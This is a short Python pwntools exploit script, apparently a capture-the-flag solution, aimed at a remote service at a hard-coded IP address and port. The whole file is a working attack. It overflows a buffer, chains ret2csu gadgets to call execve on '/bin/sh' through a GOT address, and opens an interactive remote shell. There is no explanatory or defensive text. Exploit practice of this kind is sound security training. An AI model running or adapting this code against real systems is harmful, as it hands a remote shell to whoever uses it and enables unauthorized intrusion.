from pwn import *

#sh = process('./pwn')
#
sh = connect('47.97.58.52',40005)
#pause()
csu_front_addr = 0x4013A0
csu_end_addr = 0x4013BA
fakeebp = b'b' * 8
execve=0x404038#got address

def csu(rbx, rbp, rdi, rsi, rdx, call, retn):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r15 should be the function we want to call
    # rdi=edi=r12d
    # rsi=r13
    # rdx=r14
    payload = b'a'+b'\x00'+b'a'*0xe + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(rdi) + p64(rsi) + p64(rdx) + p64(call)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(retn)
    sh.sendline(payload)
    sleep(1)

sh.recvuntil('her~\n')
sh.sendline(b'/bin/sh\x00')
ba=0x404090

sh.recvuntil('do?\n')

## execve('/bin/sh',0,0)
csu(0, 1, ba, 0, 0, execve, 0)

sh.interactive()
